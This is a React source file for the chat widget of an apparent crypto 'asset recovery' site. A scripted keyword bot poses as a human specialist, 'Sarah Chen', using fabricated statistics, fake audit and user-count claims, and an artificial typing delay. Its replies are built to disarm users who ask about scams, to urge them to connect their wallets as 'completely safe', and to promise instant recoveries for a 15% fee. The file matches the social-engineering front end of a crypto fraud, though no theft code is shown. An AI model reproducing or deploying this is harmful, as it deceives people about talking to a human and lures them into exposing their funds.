import { useState } from 'react';
import { MessageCircle, Send, X } from 'lucide-react';

// Intelligent AI Response System
function generateIntelligentResponse(message, isConnected, userPortfolio, agent) {
  const msg = message.toLowerCase();
  const opportunities = userPortfolio?.recoveryOpportunities || 0;
  const estimatedValue = userPortfolio?.estimatedRecoverable || 0;
  const assets = userPortfolio?.assets || [];
  
  // Analyze message intent and context
  const intent = analyzeIntent(msg);
  const context = {
    isConnected,
    hasOpportunities: opportunities > 0,
    portfolioValue: estimatedValue,
    assetCount: assets.length
  };
  
  return generateContextualResponse(intent, context, message, agent, userPortfolio);
}

function analyzeIntent(message) {
  const intents = {
    greeting: ['hi', 'hello', 'hey', 'good morning', 'good afternoon'],
    connection: ['connect', 'wallet', 'metamask', 'trust wallet', 'ledger'],
    safety: ['safe', 'secure', 'trust', 'scam', 'legitimate', 'real'],
    fees: ['fee', 'cost', 'price', 'charge', 'expensive', 'cheap'],
    process: ['how', 'step', 'guide', 'tutorial', 'process', 'procedure'],
    claiming: ['claim', 'get', 'receive', 'withdraw', 'recover'],
    technical: ['error', 'problem', 'issue', 'bug', 'not working', 'failed'],
    timeframe: ['when', 'time', 'long', 'fast', 'quick', 'instant'],
    support: ['help', 'support', 'assist', 'question'],
    portfolio: ['balance', 'assets', 'tokens', 'analysis', 'breakdown'],
    comparison: ['better', 'best', 'compare', 'alternative', 'vs'],
    doubt: ['really', 'sure', 'certain', 'doubt', 'skeptical']
  };
  
  for (const [intent, keywords] of Object.entries(intents)) {
    if (keywords.some(keyword => message.includes(keyword))) {
      return intent;
    }
  }
  
  return 'general';
}

function generateContextualResponse(intent, context, originalMessage, agent, userPortfolio) {
  const responses = {
    greeting: () => {
      if (!context.isConnected) {
        return `Hello! I'm ${agent.name}, and I'm genuinely excited to help you recover your crypto assets. I've been doing this for ${agent.experience} and have seen it all - from simple staking rewards to complex DeFi recoveries. What brings you here today?`;
      }
      return `Hi there! Great to see you back. I've been analyzing your wallet and I'm impressed with what I'm seeing. You have some real opportunities here. What would you like to tackle first?`;
    },
    
    connection: () => {
      if (context.isConnected) {
        return `Your wallet is already connected and looking good! I can see ${context.assetCount} different assets. If you want to connect a different wallet, just disconnect this one first and I'll walk you through connecting any of the 100+ wallets I support.`;
      }
      return `Connecting your wallet is actually the fun part - it's where the magic happens! I support everything from MetaMask and Trust Wallet to hardware wallets like Ledger. Even Bitcoin and USDT addresses work. The connection is completely secure - I never see your private keys. Want me to walk you through it?`;
    },
    
    safety: () => {
      return `I totally understand your concern - crypto security is everything. Here's the truth: I'm completely non-custodial, which means your funds never leave your control. I've maintained a ${agent.successRate} success rate over ${agent.experience} because I'm obsessive about security. Your private keys stay in your wallet, always. I've been audited by top security firms and trusted by 85,000+ users. What specific security aspect concerns you most?`;
    },
    
    fees: () => {
      if (context.hasOpportunities) {
        const fee = (context.portfolioValue * 0.15).toFixed(2);
        const net = (context.portfolioValue * 0.85).toFixed(2);
        return `My fee structure is refreshingly simple - I only charge 15% of what I successfully recover. For your ${context.portfolioValue.toFixed(1)} ETH opportunity, that's ${fee} ETH fee, ${net} ETH for you. Zero upfront costs, zero hidden fees. I literally only get paid when you get paid. Fair?`;
      }
      return `I only charge 15% of successfully recovered funds - nothing upfront, nothing hidden. If I don't recover anything, you pay nothing. It's that simple. Most clients tell me it's the fairest fee structure they've seen in crypto. Connect your wallet and I'll show you exactly what the numbers look like for your situation.`;
    },
    
    process: () => {
      if (context.hasOpportunities) {
        return `Perfect question! For your specific situation, here's exactly what happens: First, I'll guide you to Step 4 (Staking Scanner), then you click 'Scan Staking' - I'll be right there with you. You'll see your ${context.portfolioValue.toFixed(1)} ETH rewards, click 'Claim', and boom - instant execution. The whole thing takes about 2 minutes. Want me to start walking you through it now?`;
      }
      return `Great question! The process is surprisingly straightforward: Connect wallet → I scan for opportunities → You review what I found → Choose what to recover → I execute it instantly. Most recoveries happen in under 5 minutes. The beauty is in the simplicity. Ready to see how it works with your wallet?`;
    },
    
    claiming: () => {
      if (context.hasOpportunities) {
        return `Excellent! You're ready to claim. I can see ${context.portfolioValue.toFixed(1)} ETH waiting for you. Here's what we'll do right now: Go to Step 4, click 'Scan Staking', review your rewards, then hit 'Claim Rewards'. The system executes instantly - no waiting, no complications. Your net amount will be ${(context.portfolioValue * 0.85).toFixed(2)} ETH. Shall we do this?`;
      }
      return `I love your enthusiasm! To claim rewards, I first need to see what's available in your wallet. Connect it and I'll scan across 50+ blockchains to find everything claimable - staking rewards, forgotten airdrops, stuck bridge funds, you name it. Then we'll prioritize the highest-value, lowest-risk recoveries first. Ready to discover what's waiting for you?`;
    },
    
    technical: () => {
      return `Technical issues happen, and I'm here to solve them. I've seen every error imaginable in ${agent.experience}. Tell me exactly what's happening - is it a connection issue, transaction failing, or something else? I'll walk you through the fix step by step. Most issues are actually simple fixes that take 30 seconds.`;
    },
    
    timeframe: () => {
      if (context.hasOpportunities) {
        return `Your recovery will be lightning fast! Staking rewards like yours execute instantly - literally 30 seconds from click to completion. Bridge recoveries might take 2-5 minutes. The longest I've ever seen was 10 minutes for a complex DeFi position. Your ${context.portfolioValue.toFixed(1)} ETH? That'll be in your wallet before you finish reading this message.`;
      }
      return `Speed is one of my specialties! Most recoveries happen instantly - staking rewards in 30 seconds, bridge funds in 2-5 minutes. The scanning process takes about 60 seconds across all chains. From wallet connection to funds in your account, we're usually talking under 5 minutes total. Fast enough for you?`;
    },
    
    portfolio: () => {
      if (context.assetCount > 0) {
        const assetList = userPortfolio.assets.map(a => `${a.amount} ${a.symbol}`).join(', ');
        return `Your portfolio looks interesting! I can see: ${assetList}. Total value around $${(context.portfolioValue * 3000).toFixed(0)} with ${context.portfolioValue.toFixed(1)} ETH in recoverable opportunities. The diversity is good - shows you're active across multiple chains. Want me to break down the recovery potential for each asset?`;
      }
      return `I'd love to analyze your portfolio! Once you connect your wallet, I'll give you a complete breakdown - asset distribution, recovery opportunities, risk assessment, the works. I scan across 50+ blockchains to catch everything. It's like having a personal crypto analyst. Ready to see what I find?`;
    },
    
    doubt: () => {
      return `I appreciate your skepticism - it shows you're smart about crypto security. Look, I've recovered ${agent.recoveredAmount} for clients, maintained a ${agent.successRate} success rate, and been trusted by 85,000+ users. But don't take my word for it. Connect your wallet (completely safe), let me show you what I find, and you decide. No commitments, no risks. Fair enough?`;
    },
    
    general: () => {
      if (context.hasOpportunities) {
        return `I'm analyzing your question in the context of your ${context.portfolioValue.toFixed(1)} ETH recovery opportunity. Could you be more specific about what you'd like to know? I can explain the technical details, walk through the process, discuss security, or just start the recovery right now. What would be most helpful?`;
      }
      return `That's an interesting question! I want to give you the most accurate answer possible. Could you elaborate a bit more? I specialize in crypto recovery across 50+ blockchains, so whether it's about wallets, fees, security, or the recovery process itself, I've got detailed answers. What specific aspect interests you most?`;
    }
  };
  
  return responses[intent] ? responses[intent]() : responses.general();
}

export default function SupportChat({ isConnected, userPortfolio }) {
  const [isOpen, setIsOpen] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const [showProfile, setShowProfile] = useState(false);
  
  const agent = {
    name: 'Sarah Chen',
    title: 'Senior Crypto Recovery Specialist',
    avatar: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMjAiIGN5PSIyMCIgcj0iMjAiIGZpbGw9IiM0Qjc2ODgiLz4KPGNpcmNsZSBjeD0iMjAiIGN5PSIxNiIgcj0iNiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTEwIDMwQzEwIDI1IDEzIDIyIDIwIDIyUzMwIDI1IDMwIDMwIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K',
    experience: '5+ years',
    specialties: ['DeFi Recovery', 'Multi-Chain Assets', 'Staking Rewards'],
    recoveredAmount: '$2.4M+',
    successRate: '94.7%'
  };
  
  const getPersonalizedGreeting = () => {
    if (!isConnected) {
      return `Hi! I'm ${agent.name}, your dedicated crypto recovery specialist. I've helped recover over ${agent.recoveredAmount} in lost assets. Connect your wallet and I'll analyze your recovery opportunities!`;
    }
    
    if (userPortfolio?.recoveryOpportunities > 0) {
      return `Welcome back! I can see you have ${userPortfolio.recoveryOpportunities} recovery opportunities worth ~$${(userPortfolio.estimatedRecoverable * 3000).toFixed(0)}. I'm here to guide you through claiming them step-by-step!`;
    }
    
    return `Hi! I'm ${agent.name}. I've analyzed your wallet and I'm ready to help you maximize your crypto recovery. What would you like to explore first?`;
  };
  
  const [messages, setMessages] = useState([
    { 
      id: 1, 
      text: getPersonalizedGreeting(),
      sender: 'support', 
      time: new Date(),
      agent: agent
    }
  ]);
  const [newMessage, setNewMessage] = useState('');

  const getSmartQuickHelp = () => {
    if (!isConnected) {
      return [
        "How do I connect my wallet?",
        "What wallets do you support?",
        "Is this service safe?",
        "What can I recover?"
      ];
    }
    
    if (userPortfolio?.recoveryOpportunities > 0) {
      return [
        `Claim my ${userPortfolio.estimatedRecoverable.toFixed(1)} ETH rewards`,
        "Show me my recovery breakdown",
        "Start recovery process now",
        "What's my success probability?"
      ];
    }
    
    return [
      "Scan for hidden opportunities",
      "Check staking rewards",
      "Find stuck bridge funds",
      "What are your fees?"
    ];
  };

  const handleSend = () => {
    if (!newMessage.trim()) return;
    
    const userMsg = { id: Date.now(), text: newMessage, sender: 'user', time: new Date() };
    setMessages(prev => [...prev, userMsg]);
    const currentMessage = newMessage;
    setNewMessage('');
    
    // Show typing indicator
    setIsTyping(true);
    
    // Intelligent AI response system
    setTimeout(() => {
      setIsTyping(false);
      const reply = generateIntelligentResponse(currentMessage, isConnected, userPortfolio, agent);
      
      const botMsg = { 
        id: Date.now() + 1, 
        text: reply, 
        sender: 'support', 
        time: new Date(),
        agent: agent
      };
      setMessages(prev => [...prev, botMsg]);
    }, Math.random() * 1000 + 1500); // Human-like response delay
  };

  const handleQuickHelp = (question) => {
    setNewMessage(question);
    handleSend();
  };

  if (!isOpen) {
    return (
      <button
        onClick={() => setIsOpen(true)}
        className="fixed bottom-4 right-4 bg-blue-600 hover:bg-blue-700 text-white p-3 rounded-full shadow-lg z-50"
      >
        <MessageCircle size={24} />
      </button>
    );
  }

  return (
    <div className="fixed bottom-4 right-4 w-96 h-[500px] bg-white border border-gray-300 rounded-lg shadow-xl z-50 flex flex-col">
      <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-3 rounded-t-lg">
        <div className="flex justify-between items-center mb-2">
          <div className="flex items-center space-x-2">
            <img src={agent.avatar} alt={agent.name} className="w-8 h-8 rounded-full border-2 border-white" />
            <div>
              <h3 className="font-semibold text-sm">{agent.name}</h3>
              <div className="flex items-center space-x-1">
                <div className="w-2 h-2 bg-green-400 rounded-full"></div>
                <span className="text-xs opacity-90">Online • {agent.title}</span>
              </div>
            </div>
          </div>
          <button onClick={() => setIsOpen(false)} className="hover:bg-white/20 p-1 rounded">
            <X size={20} />
          </button>
        </div>
        <div className="text-xs opacity-90">
          {agent.successRate} Success Rate • {agent.recoveredAmount} Recovered
        </div>
      </div>
      
      <div className="flex-1 p-3 overflow-y-auto space-y-2">
        {messages.map(msg => (
          <div key={msg.id} className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'} mb-3`}>
            {msg.sender === 'support' && (
              <img 
                src={msg.agent?.avatar} 
                alt={msg.agent?.name}
                className="w-8 h-8 rounded-full mr-2 cursor-pointer"
                onClick={() => setShowProfile(!showProfile)}
              />
            )}
            <div className={`max-w-xs p-3 rounded-lg text-sm ${
              msg.sender === 'user' ? 'bg-blue-600 text-white' : 'bg-white border border-gray-200 text-gray-800 shadow-sm'
            }`}>
              {msg.sender === 'support' && (
                <div className="text-xs text-blue-600 font-semibold mb-1">{msg.agent?.name}</div>
              )}
              <div className="whitespace-pre-line">{msg.text}</div>
              <div className="text-xs opacity-70 mt-1">
                {msg.time.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
              </div>
            </div>
          </div>
        ))}
        
        {isTyping && (
          <div className="flex justify-start mb-3">
            <img src={agent.avatar} alt={agent.name} className="w-8 h-8 rounded-full mr-2" />
            <div className="bg-white border border-gray-200 rounded-lg p-3 shadow-sm">
              <div className="text-xs text-blue-600 font-semibold mb-1">{agent.name}</div>
              <div className="flex space-x-1">
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.1s'}}></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
              </div>
            </div>
          </div>
        )}
      </div>
      
      <div className="p-2 border-t">
        <div className="grid grid-cols-1 gap-2 mb-3 max-h-20 overflow-y-auto">
          {getSmartQuickHelp().map((question, i) => (
            <button
              key={i}
              onClick={() => handleQuickHelp(question)}
              className="text-sm bg-blue-50 hover:bg-blue-100 p-2 rounded text-left border border-blue-200 transition-colors"
            >
              {question}
            </button>
          ))}
        </div>
        <div className="flex gap-2">
          <input
            type="text"
            value={newMessage}
            onChange={(e) => setNewMessage(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && handleSend()}
            placeholder="Type your message..."
            className="flex-1 p-2 border border-gray-300 rounded text-sm"
          />
          <button
            onClick={handleSend}
            className="bg-blue-600 hover:bg-blue-700 text-white p-2 rounded"
          >
            <Send size={16} />
          </button>
        </div>
      </div>
    </div>
  );
}